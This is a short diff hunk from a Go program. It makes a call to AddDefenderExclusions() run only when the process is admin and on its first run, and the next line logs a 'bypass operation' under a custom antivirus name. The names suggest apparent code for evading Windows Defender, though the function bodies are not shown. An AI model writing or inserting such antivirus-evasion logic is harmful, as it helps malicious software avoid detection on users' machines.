@@ -46,7 +46,7 @@ func Main() {
 		return
 	}
 
-	if isAdmin() {
+	if isAdmin() && config.FirstRun {
 		AddDefenderExclusions()
 
 		log.Printf("Starting bypass operation with custom name: %s", customAVName)
